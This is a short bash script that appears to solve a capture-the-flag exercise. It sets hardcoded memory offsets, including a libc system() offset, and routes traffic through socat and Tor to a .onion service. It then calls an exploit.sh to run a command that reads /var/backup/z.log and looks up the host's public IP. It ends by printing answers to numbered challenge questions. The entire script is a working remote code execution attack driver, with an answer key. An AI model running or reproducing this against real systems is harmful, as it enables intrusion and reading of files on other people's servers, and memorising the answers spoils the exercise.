#!/bin/bash

# hardcoded values
serve_ultimate_off=2184
post_data_off=232
libc_off=-1686176 # system offset

# shell-command for system - `cat` to get the file and `dig` to get the host IP.
cmd="cat /var/backup/z.log; dig +short myip.opendns.com @resolver1.opendns.com"

kill $(pgrep -l socat | cut -f1 -d' ')
socat  TCP-LISTEN:8000,fork,reuseaddr SOCKS4A:localhost:zwt6vcp6d5tao7tbe3je6a2q4pwdfqli62ekuhjo55c7pqlet3brutqd.onion:80,socksport=9150 & sleep 2

# call the exploit
bash exploit.sh "$serve_ultimate_off" "$post_data_off" "$libc_off" "$cmd"

printf "\nQ3 Answer: '/var/backup/' \nQ4 Answer: 'Computing, approximate answer: 41.998427123123'\nQ5 Answer: c4-54.159.81.179\nREGARDS FROM The soviet-UNION <3\n"